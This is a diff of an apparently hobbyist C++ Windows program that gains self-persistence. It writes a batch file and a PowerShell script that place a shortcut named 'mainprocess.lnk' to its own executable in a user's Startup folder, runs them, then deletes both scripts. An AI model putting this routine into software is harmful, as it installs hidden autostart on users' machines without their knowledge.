@@ -8,6 +8,34 @@
 
 using namespace std;
 
+/*RUN COMMAND LINE
+string command = "f";
+char *output = string_to_charstar(exec(cmd));
+*/
+
+
+/*RUN SHELL
+
+// When using char strings
+ShellExecuteA(NULL, "open", "calc", NULL, NULL, SW_SHOW);
+// When using wchar_t strings
+ShellExecuteW(NULL, L"open", L"http://www.cplusplus.com/", NULL, NULL, SW_SHOW);
+// When you aren't sure
+ShellExecute(NULL, TEXT("open"), TEXT("calc"), NULL, NULL, SW_SHOW);
+ex:
+int nRet = (int)ShellExecuteA(NULL, "open", "a.bat", NULL, NULL, SW_SHOW);
+if (nRet > 32) {
+//OK
+//cout << "OK";
+
+
+}
+else {
+//error
+
+}
+*/
+
 
 
 char* string_to_charstar(string str) {
@@ -39,47 +67,6 @@ string exec(const char* cmd) {
 int main(int argc, char* argv[]) {
 
 
-
-	ofstream myfile;
-	myfile.open("b.bat");
-	myfile << "@echo off\n"
-		"Powershell.exe -executionpolicy remotesigned -File  bb.ps1\n"
-		"set /p temp = \"Hit enter to continue\"\n"
-		"exit / b";
-	myfile.close();
-	myfile.open("bb.ps1");
-	myfile << "calc\n"
-		"notepad\n"
-		
-		"set TARGET='C:\Program Files\NetBeans 8.2\bin\'\n"
-		"set SHORTCUT = 'D:\Temp\\test.lnk'\n"
-		"set PWS = powershell.exe - ExecutionPolicy Bypass - NoLogo - NonInteractive - NoProfile\n"
-		"%PWS% -Command \"$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(%SHORTCUT%); $S.TargetPath = %TARGET%; $S.Save()\"\n"
-		;
-	myfile.close();
-
-	int nRet = (int)ShellExecuteA(NULL, "open", "b.bat", NULL, NULL, SW_SHOW);
-	if (nRet > 32) {
-		//OK
-		//cout << "OK";
-
-
-	}
-	else {
-		//error
-
-	}
-
-
-
-
-
-
-
-
-
-
-
 	//arg[0] is filename (filename.exe)
 	const char *fileLocation;
 
@@ -92,40 +79,48 @@ int main(int argc, char* argv[]) {
 
 			
 
-			string FL(fileLocation); //char* to string
+			string sourceExe(fileLocation); //char* to string
+			
 			string command = "f";
-			command += FL;
+			command += sourceExe;
 			command = "calc & notepad"; // &: run two command, &&: run if before command done
 			//char *cmd = string_to_charstar(command);
 
+			ofstream myfile;
+			myfile.open("b.bat");
+			myfile << "@echo off\n"
+				"Powershell.exe -executionpolicy remotesigned -File  bb.ps1\n"
+				//"set /p temp = \"Hit enter to continue\"\n"  //for dont close cmd
+				"exit / b"
+				;
+			myfile.close();
+			myfile.open("bb.ps1");
+			myfile << 
+				"$SourceExe = \"" 
+				<< sourceExe <<
+				"\"\n"
+				"$DestinationPath = \"C:\\Users\\freedman\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mainprocess.lnk\"\n"
+				"$WshShell = New-Object -comObject WScript.Shell\n"
+				"$Shortcut = $WshShell.CreateShortcut($DestinationPath)\n"
+				"$Shortcut.TargetPath = $SourceExe\n"
+				"$Shortcut.Save()"
+				;
+			myfile.close();
 
-			/*RUN COMMAND LINE
-			
-			char *output = string_to_charstar(exec(cmd));
-			*/
-
-
-			/*RUN SHELL
-			
-			// When using char strings
-			ShellExecuteA(NULL, "open", "calc", NULL, NULL, SW_SHOW);
-			// When using wchar_t strings
-			ShellExecuteW(NULL, L"open", L"http://www.cplusplus.com/", NULL, NULL, SW_SHOW);
-			// When you aren't sure
-			ShellExecute(NULL, TEXT("open"), TEXT("calc"), NULL, NULL, SW_SHOW);
-			ex:
-			int nRet = (int)ShellExecuteA(NULL, "open", "a.bat", NULL, NULL, SW_SHOW);
+			int nRet = (int)ShellExecuteA(NULL, "open", "b.bat", NULL, NULL, SW_SHOW);
 			if (nRet > 32) {
 				//OK
 				//cout << "OK";
-				
-				
+				remove("b.bat");
+				remove("bb.ps1");
 			}
 			else {
 				//error
 
 			}
-			*/
+
+			cout << "1 done.";
+			
 		}
 		else if (argv[2][0] == '2') {
 
@@ -134,7 +129,7 @@ int main(int argc, char* argv[]) {
 		}
 
 	}
-	cout << "heeeeeeeeeey";
+	
 	_getch();
 
 	return 0;
